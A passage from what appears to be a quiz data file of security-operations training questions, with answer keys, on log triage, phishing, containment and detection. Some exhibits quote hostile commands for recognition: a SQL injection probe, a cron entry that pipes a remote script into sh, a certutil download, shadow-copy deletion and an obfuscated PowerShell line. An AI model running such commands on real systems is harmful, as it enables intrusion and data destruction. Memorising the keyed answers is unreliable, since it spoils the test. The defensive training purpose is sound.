    options: ["Check the claim against approved test records and isolate meanwhile","Delete the tool, and tell the developer not to use it again, as a first step","Accept the explanation, and close the alert as a test","Wait for the developer's manager to confirm next week"],
    correct: 0, why: "Accepting the claim is the runner-up because developers do run test tools, but a statement is not authorisation; verify records and contain meanwhile.",
    hint: "Verify, then decide."
  },
  {
    id: 59, rank: 1, role: "soc", topic: "Web Log SQL Injection", difficulty: "INTERMEDIATE",
    exhibit: "198.51.100.8 - - [02/Mar/2026:10:11:02] \"GET /product.php?id=5%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 200 5123",
    q: "What does this web server log line most likely show?",
    options: ["A normal product page visit by a customer, in most cases","A health check from the load balancer, in most cases","A file download by a registered customer, as a general rule","A SQL injection attempt on the id parameter"],
    correct: 3, why: "The encoded UNION SELECT in the parameter is a classic injection probe.",
    hint: "Decode the parameter."
  },
  {
    id: 60, rank: 1, role: "soc", topic: "RDP Brute Force Response", difficulty: "INTERMEDIATE",
    q: "Logs show thousands of failed RDP logons from the internet, then one success for an admin account. What is the best next step?",
    options: ["Raise the number of failed logons allowed before lockout","Treat it as a compromise and isolate the host","Wait for a second successful logon before deciding on action","Block the source IP address and close the ticket as resolved"],
    correct: 1, why: "A success after a brute force burst means the attacker may already be in, so blocking the IP alone is not enough.",
    hint: "The success is the problem."
  },
  {
    id: 61, rank: 1, role: "soc", topic: "Phishing URL Analysis", difficulty: "INTERMEDIATE",
    q: "Which URL is most likely a credential harvesting page for a company that uses login.contoso.com?",
    options: ["https://login.contoso.com.secure-check.example/signin","https://login.contoso.com/signin?redirect=portal, as a general rule","https://contoso.com/login/help/reset","https://www.contoso.com/about/careers"],
    correct: 0, why: "The real registrable domain is secure-check.example, with the company name placed in front to deceive readers.",
    hint: "Read the domain from the right."
  },
  {
    id: 62, rank: 1, role: "soc", topic: "SOAR Automation Risk", difficulty: "INTERMEDIATE",
    q: "A team wants SOAR to disable any account that triggers an impossible travel alert. What is the BEST view?",
    options: ["Avoid automation, as analysts are always more reliable","Automate fully, as response speed matters most","Automate with safeguards such as VPN exclusions and approval for admins","Disable accounts only after three alerts have been seen for the user"],
    correct: 2, why: "Avoiding automation is the runner-up because it prevents mistakes, but it is slow; guarded automation balances speed and business impact.",
    hint: "Automate with guard rails."
  },
  {
    id: 63, rank: 1, role: "soc", topic: "Linux Auth Log", difficulty: "INTERMEDIATE",
    exhibit: "Mar  2 03:12:44 web1 sshd[2210]: Failed password for root from 203.0.113.77 port 51822 ssh2\nMar  2 03:12:46 web1 sshd[2212]: Failed password for root from 203.0.113.77 port 51830 ssh2\nMar  2 03:12:49 web1 sshd[2215]: Failed password for root from 203.0.113.77 port 51841 ssh2\nMar  2 03:12:51 web1 sshd[2218]: Accepted password for root from 203.0.113.77 port 51850 ssh2",
    q: "What does this auth.log extract indicate?",
    options: ["A scheduled job ran under the root account","A user changed their own password successfully","Root was accepted after repeated failures from one address","The system rebooted during a maintenance window, as a general rule"],
    correct: 2, why: "The accepted root login after a burst of failures suggests the password was guessed.",
    hint: "Failures, then success."
  },
  {
    id: 64, rank: 1, role: "soc", topic: "Threat Intel Confidence", difficulty: "INTERMEDIATE",
    q: "A feed lists an IP as malicious with low confidence from an unknown source. How should it be used?",
    options: ["Ignored completely, as all feeds are unreliable","As proof in a legal case against the owner of the IP","As investigation context, not an automatic block","As the reason to block the whole range worldwide"],
    correct: 2, why: "Low-confidence intelligence supports hunting and enrichment but needs corroboration before action.",
    hint: "Use confidence to choose the action."
  },
  {
    id: 65, rank: 1, role: "soc", topic: "Detection Coverage Mapping", difficulty: "INTERMEDIATE",
    q: "What is the best use of mapping detections to ATT&CK techniques?",
    options: ["Proving to auditors that every attack is blocked","Scoring the monthly performance of individual analysts","Reducing all of the log sources down to a single one","Finding techniques that have no detection coverage"],
    correct: 3, why: "Coverage mapping highlights gaps so detection engineering can prioritise by risk.",
    hint: "Gaps, not scores."
  },
  {
    id: 66, rank: 1, role: "soc", topic: "Office Child Process", difficulty: "INTERMEDIATE",
    q: "Which alert is the most concerning?",
    options: ["Excel opening a CSV file saved on the local disk","Excel launching cmd.exe, which starts curl to fetch a file, in most cases","Excel checking the vendor site for add-in updates","Excel saving a workbook to a department share"],
    correct: 1, why: "Office applications rarely launch shells that download content; this chain suggests macro or exploit execution.",
    hint: "Parent-child chain."
  },
  {
    id: 67, rank: 1, role: "soc", topic: "DNS Tunnelling Signals", difficulty: "INTERMEDIATE",
    exhibit: "10:21:01 q=aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgb2YgZGF0YQ.t.evil-dns.example A\n10:21:01 q=ZXhmaWx0cmF0aW9uIGNodW5rIDAwMDIgb2YgMDA0Mg.t.evil-dns.example A\n10:21:02 q=Y2h1bmsgMDAwMyBwYXlsb2FkIGlzIGVuY29kZWQ.t.evil-dns.example A",
    q: "Which feature of this DNS log best indicates tunnelling?",
    options: ["Queries for popular news sites during the lunch hour, as a general rule","Queries for the internal domain controller names, as a general rule","Queries with normal short host names for printers, as a general rule","Long encoded subdomains at a high rate to one domain"],
    correct: 3, why: "Data hidden in subdomain labels produces long, high-entropy names sent repeatedly to one authoritative server.",
    hint: "Length, entropy and rate."
  },
  {
    id: 68, rank: 1, role: "soc", topic: "Exfiltration Volume", difficulty: "INTERMEDIATE",
    q: "A workstation uploaded 8 GB to a personal cloud storage site at 2 a.m. The user works days. What is the BEST first action?",
    options: ["Email the user to ask whether they did it, and wait for the reply","Block every cloud storage site for the whole company at once","Ignore it, as personal cloud storage is common","Check what was uploaded and contain if it was unauthorised"],
    correct: 3, why: "Blocking everything is the runner-up and would stop the transfer, but it is disproportionate before facts are known; scoping first guides proportionate action.",
    hint: "Scope before broad blocking."
  },
  {
    id: 69, rank: 1, role: "soc", topic: "Service Installation Event", difficulty: "INTERMEDIATE",
    q: "Event 7045 shows a new service whose binary is a random-named file in C:\\Windows\\Temp. What is the best interpretation?",
    options: ["A printer driver being installed by the helpdesk","Possible malicious service used for persistence or remote execution","A normal Windows update installing a component","A user changing a display preference setting"],
    correct: 1, why: "Services pointing to randomly named binaries in temp folders are common with lateral movement tools.",
    hint: "Odd binary path."
  },
  {
    id: 70, rank: 1, role: "soc", topic: "Containment Choice", difficulty: "INTERMEDIATE",
    q: "An infected server hosts a critical but non-safety application. What is the BEST containment?",
    options: ["Shut it down at once by removing power to the machine","Isolate it from the network but leave it powered on","Leave it connected to the network while the team monitors it","Reinstall the operating system straight away to remove the malware"],
    correct: 1, why: "Powering off is the runner-up because it stops the threat, but it loses volatile memory; isolation keeps evidence while limiting spread.",
    hint: "Isolate, do not power off."
  },
  {
    id: 71, rank: 1, role: "soc", topic: "Incident Timeline", difficulty: "INTERMEDIATE",
    q: "Why build a timeline early in an investigation?",
    options: ["It guarantees that the attacker will be identified by name","It reduces the volume of logs stored in the SIEM","It shows the order of events and the likely entry point","It replaces the need for collecting any further evidence from systems"],
    correct: 2, why: "Timelines connect events across systems and help scope the incident.",
    hint: "Order of events."
  },
  {
    id: 72, rank: 1, role: "soc", topic: "Honeypot Alert", difficulty: "INTERMEDIATE",
    q: "An alert fires on a honeypot server that no user should ever access. What is the most reasonable conclusion?",
    options: ["A false positive from the monitoring tool, as honeypots are unmanaged","High-confidence sign of scanning or internal compromise","A scheduled vendor test of the security awareness programme","A performance problem on the virtualisation host running it"],
    correct: 1, why: "Legitimate users have no reason to touch a honeypot, so activity there is suspicious by design.",
    hint: "No legitimate use."
  },
  {
    id: 73, rank: 1, role: "soc", topic: "Email Rule Compromise", difficulty: "INTERMEDIATE",
    exhibit: "Operation: New-InboxRule User: cfo@contoso.com Parameters: SubjectContainsWords=invoice,payment MoveToFolder=RSS Feeds MarkAsRead=True",
    q: "Which audit log entry most strongly indicates business email compromise?",
    options: ["A gradual increase in the mailbox size over the quarter, as a general rule","A calendar invitation accepted by the finance manager, in most cases","A user changing the colour theme of their mailbox, as a general rule","A new rule hiding replies about invoices in an RSS folder"],
    correct: 3, why: "Attackers hide replies about payments with rules that move or delete matching messages.",
    hint: "Hide the replies."
  },
  {
    id: 74, rank: 1, role: "soc", topic: "Quarantined File Handling", difficulty: "INTERMEDIATE",
    q: "The antivirus quarantines a file on a server. What should the SOC still do?",
    options: ["Nothing further, as the antivirus has handled it","Reboot the server to make sure it is completely clean","Check how it arrived and whether it ran or spread","Restore the file from quarantine to test whether it is harmful"],
    correct: 2, why: "Quarantine removes the file but not any behaviour already seen; the entry path must be understood.",
    hint: "Quarantine is not closure."
  },
  {
    id: 75, rank: 1, role: "soc", topic: "Log Source Onboarding", difficulty: "INTERMEDIATE",
    q: "A new cloud application will hold customer data. What is the BEST approach to log onboarding?",
    options: ["Ingest everything that the application is able to produce","Ingest only the error logs to keep costs predictable","Define detection use cases first, then onboard the logs they need, wherever possible","Wait until an incident shows which logs would have been needed"],
    correct: 2, why: "Ingesting everything is the runner-up because it is thorough, but it raises cost and noise; use cases decide the needed fields.",
    hint: "Use case driven logging."
  },
  {
    id: 76, rank: 1, role: "soc", topic: "Memory Forensics Basics", difficulty: "INTERMEDIATE",
    q: "Why capture memory from a suspected infected host before rebooting?",
    options: ["Processes, connections and keys in memory are lost at reboot","It makes the host run faster after the later restart","Memory is always cleaner and easier to read than disk images","The antivirus product requires it before it will quarantine a file"],
    correct: 0, why: "Volatile evidence is lost when power is removed, so it is captured first.",
    hint: "Volatile evidence."
  },
  {
    id: 77, rank: 1, role: "soc", topic: "Impossible Travel Review", difficulty: "INTERMEDIATE",
    q: "A user signs in from London, then from Sydney 30 minutes later. Which fact would make this a likely false positive?",
    options: ["Both sign-ins came through the company VPN with exits in those regions","The user agent string changed between the two sign-ins, as a general rule","The user changed their password between the two sign-ins, in most cases","The second sign-in had a failed MFA step before success"],
    correct: 0, why: "Corporate VPN exits can place a user in different countries quickly without any compromise.",
    hint: "Check for VPN exits."
  },
  {
    id: 78, rank: 1, role: "soc", topic: "Hash Reputation Limits", difficulty: "INTERMEDIATE",
    q: "Why can a file hash be a weak indicator on its own?",
    options: ["Hashes are identical for every file of the same size","Any small change to the file gives a different hash","Hashes cannot be searched in endpoint or SIEM data","Hashes only exist for files that run on Linux systems"],
    correct: 1, why: "Attackers recompile or pack samples, so hashes expire quickly; behaviours are more durable.",
    hint: "Trivially changed."
  },
  {
    id: 79, rank: 1, role: "soc", topic: "Case Severity", difficulty: "INTERMEDIATE",
    q: "Which factor should raise the severity of an incident the most?",
    options: ["The incident was first noticed on a Monday morning","The alert came from a newly bought vendor tool","The ticket already has many comments from analysts","Evidence of access to regulated customer data"],
    correct: 3, why: "Impact on sensitive data creates legal and business consequences that drive severity.",
    hint: "Impact over noise."
  },
  {
    id: 80, rank: 1, role: "soc", topic: "Purple Team Value", difficulty: "INTERMEDIATE",
    q: "What is the main value of a purple team exercise for a SOC?",
    options: ["Replacing the need for any annual penetration test","Training staff across the company to report phishing, until the next scheduled review takes place","Testing technique by technique whether detections fire, then fixing gaps, as soon as practical","Replacing the need to collect logs from endpoints, and review the outcome at the next monthly meeting"],
    correct: 2, why: "Red and blue work together so each simulated technique is checked against detections and gaps are fixed.",
    hint: "Test then improve."
  },
  {
    id: 81, rank: 1, role: "soc", topic: "Cloud Console Login", difficulty: "INTERMEDIATE",
    q: "A cloud audit log shows a console login without MFA by a break-glass account at 4 a.m. What is the best response?",
    options: ["Turn off logging for it to reduce alert noise","Validate it with the approval record and treat it as an incident if absent","Delete the account to prevent any further misuse","Ignore it, as break-glass accounts are allowed to skip controls"],
    correct: 1, why: "Break-glass use is allowed only under approval, so every use must be validated.",
    hint: "Validate every use."
  },
  {
    id: 82, rank: 1, role: "soc", topic: "Alert Enrichment Order", difficulty: "INTERMEDIATE",
    q: "Which enrichment gives the most value first when triaging an alert about a host?",
    options: ["The time of the next team meeting in the diary","Asset criticality, and owner, in most cases","The colour code assigned to the alert by the vendor tool","The seniority of the analyst who picked up the case"],
    correct: 1, why: "Knowing what the host does and who owns it guides priority and contact.",
    hint: "Context for priority."
  },
  {
    id: 83, rank: 1, role: "soc", topic: "Web Shell Indicators", difficulty: "INTERMEDIATE",
    q: "A new .aspx file appears on a public web server and the web process spawns cmd.exe. What is the BEST response?",
    options: ["Wait a few days to see whether the file reappears","Delete the file, and carry on monitoring the server as before","Restart the web service, and the file is no longer loaded","Treat it as a web shell, isolate the server and preserve the file and logs, in most cases"],
    correct: 3, why: "Deleting the file is the runner-up because it removes the tool, but it destroys evidence and misses the entry path and persistence.",
    hint: "Preserve, then investigate."
  },
  {
    id: 84, rank: 1, role: "soc", topic: "Exploit Against Patched Host", difficulty: "INTERMEDIATE",
    q: "An IDS alert shows exploit traffic for a vulnerability that the target server is patched against. What is the best handling?",
    options: ["Confirm the patch level, log it and keep monitoring","Escalate as a critical breach, and call the whole incident team","Shut the server down until the vendor confirms it is safe","Ignore every IDS alert about exploits from now on"],
    correct: 0, why: "Exploit attempts against patched systems are attempts, not breaches, but verifying patch status closes the question.",
    hint: "Attempt, not success."
  },
  {
    id: 85, rank: 1, role: "soc", topic: "Stakeholder Communication", difficulty: "INTERMEDIATE",
    q: "During an active incident, what should updates to executives focus on?",
    options: ["Detailed packet captures, and raw command output from every host","Names of the analysts who made mistakes in the first hour","Business impact, status, decisions needed and next update time","Every command that the team has run as the alert fired"],
    correct: 2, why: "Executives need decisions and impact, not technical detail.",
    hint: "Impact and decisions."
  },
  {
    id: 86, rank: 1, role: "soc", topic: "Detection Gap After Attack", difficulty: "INTERMEDIATE",
    q: "After an attack that raised no alert, what is the best response by detection engineering?",
    options: ["Delete the old rules that failed to fire during the attack","Switch to a different SIEM product before the next quarter","Blame the analyst on shift and retrain the whole team","Find the missing telemetry or logic, then build and test a rule, as a general rule"],
    correct: 3, why: "Post-incident detection gaps drive new rules, with tests to confirm they would now fire.",
    hint: "Close the gap."
  },
  {
    id: 87, rank: 1, role: "soc", topic: "Linux Cron Persistence", difficulty: "INTERMEDIATE",
    exhibit: "*/5 * * * * root curl -s http://203.0.113.45/x.sh | sh\n0 2 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf\n30 1 * * * postgres /usr/local/bin/backup_db.sh",
    q: "Which finding on a Linux server most suggests persistence?",
    options: ["A new cron entry fetching and running a script from a remote host","A cron job that rotates logs weekly as configured by the vendor","A cron job that backs up the database every night","A cron job that runs the antivirus signature update, in most cases"],
    correct: 0, why: "Cron entries that pull and run remote scripts are a simple, common persistence mechanism.",
    hint: "Remote script, scheduled."
  },
  {
    id: 88, rank: 1, role: "soc", topic: "Pass-the-Hash Evidence", difficulty: "INTERMEDIATE",
    q: "Logon events show an admin account authenticating with NTLM from a workstation it has never used, with no preceding password logon. What is the BEST conclusion?",
    options: ["A failure of the domain controller clock that skewed times, in most cases","A user typing the wrong password, and no action is needed","Normal use, as admins log on to many machines","Likely pass-the-hash, so isolate the source host and reset the account"],
    correct: 3, why: "Normal use is the runner-up since admins do move around, but NTLM network logons without a password event from a new host fit credential reuse.",
    hint: "New host, NTLM, no password logon."
  },
  {
    id: 89, rank: 1, role: "soc", topic: "SIEM Correlation Window", difficulty: "INTERMEDIATE",
    q: "A correlation rule needs failed logons followed by a success. What is the main effect of widening the time window from 5 minutes to 24 hours?",
    options: ["More true slow attacks are found, but false positives also rise","The rule no longer needs any log sources","Rules run faster with fewer resources needed","False positives disappear completely"],
    correct: 0, why: "Longer windows catch slow attacks but also join unrelated events, so tuning must balance both.",
    hint: "Trade coverage and noise."
  },
  {
    id: 90, rank: 1, role: "soc", topic: "Suspicious Parent Process", difficulty: "INTERMEDIATE",
    q: "Which process tree is the most suspicious?",
    options: ["svchost.exe started by services.exe","svchost.exe started by explorer.exe from a user folder","taskhostw.exe started by svchost.exe","explorer.exe started by userinit.exe"],
    correct: 1, why: "Genuine svchost.exe is started by services.exe; a different parent or path indicates masquerading.",
    hint: "Know the real parent."
  },
  {
    id: 91, rank: 1, role: "soc", topic: "Impossible Travel Alert", difficulty: "INTERMEDIATE",
    exhibit: "08:55 SIGNIN user=m.ortiz src=London GB MFA=ok device=laptop-114\n09:03 SIGNIN user=m.ortiz src=Singapore SG MFA=ok device=unknown\n09:04 MAIL rule created: forward all to external address",
    q: "What does this sign-in sequence suggest?",
    options: ["A normal change of device after a password reset by the helpdesk","Possible account takeover with sessions from two distant places","A scheduled report that signs in as the service account each hour","A user who works from the office, and moves between meeting rooms"],
    correct: 1, why: "Two successful sign-ins from far apart locations within minutes are not physically possible for one person.",
    hint: "Distance and time."
  },
  {
    id: 92, rank: 1, role: "soc", topic: "Alert Tuning Approach", difficulty: "INTERMEDIATE",
    q: "A detection rule produces many false positives from one backup server. What is the BEST improvement?",
    options: ["Ignore the alerts and close them without review","Raise the alert severity, and more people look at them","Disable the rule for every server in the environment","Add a narrow exception for the known backup behaviour"],
    correct: 3, why: "Disabling the rule is the runner-up as it removes noise, but a narrow exception keeps detection for all other hosts.",
    hint: "Narrow exception."
  },
  {
    id: 93, rank: 1, role: "soc", topic: "Parent Process Anomaly", difficulty: "INTERMEDIATE",
    exhibit: "winword.exe (PID 4120)\n  \\-- cmd.exe (PID 5532) /c powershell -nop -w hidden ...\nexplorer.exe (PID 2204)\n  \\-- notepad.exe (PID 6012)",
    q: "Which process relationship is the most suspicious on a workstation?",
    options: ["A terminal starting the user's own script","A browser starting its own helper process for tabs","A word processor starting a command shell","The file explorer opening a document viewer"],
    correct: 2, why: "Office applications rarely start shells and this pattern is common after malicious documents.",
    hint: "Who started whom?"
  },
  {
    id: 94, rank: 1, role: "soc", topic: "Threat Hunt Hypothesis", difficulty: "INTERMEDIATE",
    q: "Which statement is a good starting hypothesis for a threat hunt?",
    options: ["Hunting is only useful after a confirmed breach has occurred","Every alert from the firewall is a real attack","Attackers may be using scheduled tasks for persistence on servers","The network is probably fine, and needs no checking"],
    correct: 2, why: "A testable hypothesis names a behaviour and a data source to check.",
    hint: "Testable idea."
  },
  {
    id: 95, rank: 1, role: "soc", topic: "DNS Log Review", difficulty: "INTERMEDIATE",
    exhibit: "host=10.8.2.31 query=a9f3kx0q7vb2m1zt8w4c.cdn-sync.example.net TXT\nhost=10.8.2.31 query=p0e8r5y2u7i3o1l6k9j4.cdn-sync.example.net TXT\nhost=10.8.2.31 query=q2w3e4r5t6y7u8i9o0p1.cdn-sync.example.net TXT",
    q: "What does this DNS log suggest about the host?",
    options: ["A user browsing popular news websites at lunch time, in most cases","Normal lookups for the company intranet servers, as a general rule","Possible tunnelling with very long random subdomains","A software vendor checking for the latest update, as a general rule"],
    correct: 2, why: "Long high-entropy subdomains in many queries to one domain can carry hidden data.",
    hint: "Look at the names."
  },
  {
    id: 96, rank: 1, role: "soc", topic: "Enrichment Value", difficulty: "INTERMEDIATE",
    q: "Why enrich an alert with threat intelligence before escalating it?",
    options: ["It adds context such as known malicious infrastructure","It removes the need to look at the host logs at all","It lets the analyst avoid writing notes in the ticket","It guarantees the alert will always be closed as a false positive"],
    correct: 0, why: "Context shortens triage and improves confidence in the decision.",
    hint: "Add context."
  },
  {
    id: 97, rank: 1, role: "soc", topic: "Email Gateway Block Rule", difficulty: "INTERMEDIATE",
    q: "A phishing campaign uses many sender domains but one link host. What is the most effective block?",
    options: ["Block each sender domain one at a time as they are seen","Block the shared link host at the web proxy, and mail gateway, in most cases","Remove the mail gateway from the network path","Ask users to stop opening email on Fridays"],
    correct: 1, why: "Blocking the common element covers all variants of the campaign.",
    hint: "Common element."
  },
  {
    id: 98, rank: 1, role: "soc", topic: "False Negative Review", difficulty: "INTERMEDIATE",
    q: "A breach is found that the SOC never alerted on. What is the best follow-up?",
    options: ["Review the missed telemetry and write a new detection","Remove the investigation from the report to avoid blame","Reduce the logging level to cut the storage cost","Assume the attacker was exceptionally advanced and move on"],
    correct: 0, why: "Each miss should become a detection improvement.",
    hint: "Learn from the miss."
  },
  {
    id: 99, rank: 1, role: "soc", topic: "Initial Containment Decision", difficulty: "INTERMEDIATE",
    q: "A compromised user account is being used to read the mailbox of executives. What is the BEST first containment step?",
    options: ["Wait a few days to learn more about the attacker, as soon as practical","Delete the mailboxes of the executives, as soon as practical","Disable the account and revoke its active sessions","Ask the user to change the password by email, as a first step"],
    correct: 2, why: "Waiting is the runner-up as it gathers intelligence, but it allows continued access to sensitive mail.",
    hint: "Cut access now."
  },
  {
    id: 100, rank: 1, role: "soc", topic: "Handover Quality Exhibit", difficulty: "INTERMEDIATE",
    exhibit: "Handover 22:00\nINC-4410 phishing campaign - ongoing\nINC-4415 malware on laptop - ?\nINC-4417 VPN anomaly - see ticket\nNotes: busy night, good luck",
    q: "What is missing from this shift handover note?",
    options: ["Current status next steps and owners for the open incidents","The colour theme of the ticketing tool","The names of the analysts who finished their shifts, as a general rule","The weather forecast for the next working day, as a general rule"],
    correct: 0, why: "A handover must let the next shift continue without delay.",
    hint: "Status and next steps."
  },
  {
    id: 101, rank: 2, role: "soc", topic: "LSASS Access Alert", difficulty: "ADVANCED",
    exhibit: "EventID 10 SourceImage: C:\\Users\\Public\\procdump64.exe\nTargetImage: C:\\Windows\\System32\\lsass.exe\nGrantedAccess: 0x1FFFFF",
    q: "Which Sysmon event pattern best supports credential dumping?",
    options: ["Chrome opening its profile folder to read saved bookmark, and extension data","Explorer creating its thumbnail cache after a user browses a large picture folder","A tool opening lsass.exe with full access","The antivirus scanning the download folder after a user saves a new installer"],
    correct: 2, why: "Credential dumpers need to read LSASS memory, which Sysmon event 10 records with the granted access mask.",
    hint: "Who touches LSASS."
  },
  {
    id: 102, rank: 2, role: "soc", topic: "Golden Ticket Hunt", difficulty: "ADVANCED",
    q: "A hunt finds a Kerberos TGT with a 10 year lifetime used by an account that does not exist in the directory. What is the BEST conclusion?",
    options: ["A time skew bug between servers, and synchronise the clocks and recheck","A misconfigured service ticket policy, and adjust it and close the case","A forged ticket, so plan a double krbtgt reset and scope the domain","A cached ticket for a deleted user, and no action is needed"],
    correct: 2, why: "A cached ticket for a deleted user is the runner-up since stale tickets exist, but a 10 year lifetime and a non-existent account indicate forgery.",
    hint: "Impossible values."
  },
  {
    id: 103, rank: 2, role: "soc", topic: "Zeek Connection Log", difficulty: "ADVANCED",
    exhibit: "ts=1709366400 id.orig_h=10.1.4.22 id.resp_h=185.220.101.7 id.resp_p=443 orig_bytes=312 resp_bytes=128\nts=1709366460 id.orig_h=10.1.4.22 id.resp_h=185.220.101.7 id.resp_p=443 orig_bytes=311 resp_bytes=128\nts=1709366520 id.orig_h=10.1.4.22 id.resp_h=185.220.101.7 id.resp_p=443 orig_bytes=312 resp_bytes=129\nts=1709366581 id.orig_h=10.1.4.22 id.resp_h=185.220.101.7 id.resp_p=443 orig_bytes=313 resp_bytes=128",
    q: "What does this Zeek conn.log extract most likely represent?",
    options: ["A large nightly backup transfer","A DNS lookup storm","A video call","Beaconing at regular intervals with near identical byte counts"],
    correct: 3, why: "Evenly spaced connections with constant small byte counts are typical of command and control check-ins.",
    hint: "Look at timing and size."
  },
  {
    id: 104, rank: 2, role: "soc", topic: "Living Off the Land Binary", difficulty: "ADVANCED",
    q: "Which command line most likely shows abuse of a built-in binary to download malware?",
    options: ["certutil -viewstore my","certutil -hashfile report.pdf SHA256","certutil -urlcache -split -f http://203.0.113.9/a.exe a.exe","certutil -verify cert.cer"],
    correct: 2, why: "certutil with -urlcache and -f fetches remote files, a well known living-off-the-land download technique.",
    hint: "Download flags."
  },
  {
    id: 105, rank: 2, role: "soc", topic: "Timestomping Detection", difficulty: "ADVANCED",
    q: "Which evidence best suggests timestomping on a dropped file?",
    options: ["$SI creation time earlier than $FN time, in most cases","The file is very small, and was written by a standard user account","The file is stored in the Downloads folder of the logged on user","The file has an unusually long file name made of random characters"],
    correct: 0, why: "Attackers modify $STANDARD_INFORMATION timestamps with tools, but $FILE_NAME times usually remain true, so a mismatch is a sign.",
    hint: "Compare $SI and $FN."
  },
  {
    id: 106, rank: 2, role: "soc", topic: "Cloud Audit Anomaly", difficulty: "ADVANCED",
    exhibit: "ListBuckets user=build-svc ip=198.51.100.44\nGetObject bucket=hr-exports key=payroll-2025.csv user=build-svc\nGetObject bucket=finance-reports key=q4.xlsx user=build-svc\nCreateAccessKey user=build-svc newKey=AKIA...Z3Q",
    q: "CloudTrail shows ListBuckets, GetObject on many buckets and then a new access key created for an old user. What is the BEST response?",
    options: ["Email the user to ask about the activity and wait for the reply, as a general rule","Disable the keys and sessions, preserve logs and scope data access","Delete only the new key and watch for further activity, until the next scheduled review takes place","Move the old user to a stricter group, and wait for the next review"],
    correct: 1, why: "Deleting only the new key is the runner-up because it removes one persistence item, but the attacker still holds the original credentials and sessions.",
    hint: "Revoke all, not one."
  },
  {
    id: 107, rank: 2, role: "soc", topic: "Process Injection Signals", difficulty: "ADVANCED",
    q: "Which API call sequence is the strongest indicator of classic process injection?",
    options: ["OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, as a general rule","RegOpenKey, RegQueryValue, RegCloseKey","CreateFile, ReadFile, CloseHandle","GetSystemTime, Sleep, ExitProcess"],
    correct: 0, why: "Allocating memory in another process, writing code and starting a remote thread is the classic injection chain.",
    hint: "Alloc, write, thread."
  },
  {
    id: 108, rank: 2, role: "soc", topic: "Detection Engineering Test", difficulty: "ADVANCED",
    q: "Why should every new detection rule be tested against simulated attacker activity before release?",
    options: ["To lower the SIEM licence cost by reducing the number of events stored","To confirm it fires, and measure noise, in most cases","To replace the peer review that other engineers would do on the rule logic","To avoid writing any documentation about what the rule is meant to find"],
    correct: 1, why: "Testing shows whether the logic works on real telemetry and what noise it creates.",
    hint: "Prove it fires."
  },
  {
    id: 109, rank: 2, role: "soc", topic: "Ransomware Precursor Hunt", difficulty: "ADVANCED",
    exhibit: "vssadmin delete shadows /all /quiet\nsc stop VeeamBackupSvc\nwmic /node:@servers.txt process call create \"cmd /c c:\\temp\\enc.exe\"",
    q: "Which hunt finding is the most typical precursor to ransomware deployment?",
    options: ["Shadow copies deleted and a backup service stopped","A user installing a new browser extension from the company store","A calendar invitation sent to every employee for a company event","A printer driver update pushed out to the finance floor"],
    correct: 0, why: "Operators disable recovery options and spread with admin tools just before encrypting.",
    hint: "Remove recovery first."
  },
  {
    id: 110, rank: 2, role: "soc", topic: "IOC Aging", difficulty: "ADVANCED",
    q: "Why should IP-based indicators in blocklists have an expiry date?",
    options: ["The SIEM can only store indicators that were added during the last week","Attackers use each address for only one second and then discard it","Addresses are reassigned, so old entries block legitimate services","IP addresses gradually change colour in the reputation databases, and cannot be trusted"],
    correct: 2, why: "Infrastructure is reused or reassigned, so stale indicators cause false positives.",
    hint: "Indicators decay."
  },
  {
    id: 111, rank: 2, role: "soc", topic: "Alert Correlation Decision", difficulty: "ADVANCED",
    q: "Three low-severity alerts for one user occur within 20 minutes: unusual sign-in, new MFA device and mass mailbox download. What is the BEST action?",
    options: ["Ask the user whether they are travelling, and rely on the answer","Close each alert separately as low severity","Raise one high-priority incident and contain the account","Wait to see whether a fourth alert arrives from the user"],
    correct: 2, why: "Asking the user is the runner-up and may add context, but together the alerts form an account takeover chain that needs containment first.",
    hint: "Chain, not single alerts."
  },
  {
    id: 112, rank: 2, role: "soc", topic: "Command Line Obfuscation", difficulty: "ADVANCED",
    q: "Which command line most likely uses obfuscation to evade detection?",
    options: ["ping 8.8.8.8 -n 4 to test the link to the branch office","cmd /c \"s^e^t x=po&&set y=wer&&%x%%y%shell -ep bypass\"","ipconfig /all piped to a text file for the helpdesk ticket","cmd /c dir C:\\ /s /b > C:\\temp\\filelist.txt for the audit"],
    correct: 1, why: "Caret insertion and string concatenation hide the word powershell from simple signatures.",
    hint: "Broken keywords."
  },
  {
    id: 113, rank: 2, role: "soc", topic: "Detecting DCSync", difficulty: "ADVANCED",
    exhibit: "EventID 4662 SubjectUserName: svc-sql ObjectType: domainDNS Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes) {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)",
    q: "Which log pattern best indicates a DCSync attack?",
    options: ["A new group policy object being linked to the server organisational unit","Replication rights used by a non-DC account","A user resetting their own password through the self-service portal","A domain controller replicating normally with another domain controller in the same site"],
    correct: 1, why: "DCSync abuses directory replication permissions from a non-DC to pull password hashes.",
    hint: "Replication from a non-DC."
  },
  {
    id: 114, rank: 2, role: "soc", topic: "Forensic Triage Order", difficulty: "ADVANCED",
    q: "Which evidence should be collected first from a live compromised server?",
    options: ["The installation media, as it shows how the server was first built","The disk image, as it contains the full history of the file system","The backup tapes, as they hold the last known good copy of the data","Memory and active connections, since they are the most volatile"],
    correct: 3, why: "Order of volatility puts memory and active connections before disk and archives.",
    hint: "Most volatile first."
  },
  {
    id: 115, rank: 2, role: "soc", topic: "False Positive Root Cause", difficulty: "ADVANCED",
    q: "A rule on rare parent-child processes alerts on a new HR software installer. What is the BEST action?",
    options: ["Lower the severity of the whole rule, and analysts see it less","Disable the rule for a month while the rollout finishes","Confirm the signature, then add a publisher exception","Block the installer for every user in the company"],
    correct: 2, why: "Lowering severity for the whole rule is the runner-up since it quietens alerts, but it weakens every true detection; a specific exception is safer.",
    hint: "Specific exceptions."
  },
  {
    id: 116, rank: 2, role: "soc", topic: "Network Flow Analysis", difficulty: "ADVANCED",
    q: "NetFlow shows a server sending 2 GB to an external IP on port 53. What is the best interpretation?",
    options: ["Normal DNS resolution for a busy server","Possible DNS tunnelling","Backup traffic","Software updates"],
    correct: 1, why: "DNS queries and responses are tiny, so gigabytes to one external host on port 53 are abnormal.",
    hint: "Volume on a small protocol."
  },
  {
    id: 117, rank: 2, role: "soc", topic: "Office Macro Triage", difficulty: "ADVANCED",
    q: "A document opens, enables macros and drops a DLL, which rundll32 loads. What technique is this?",
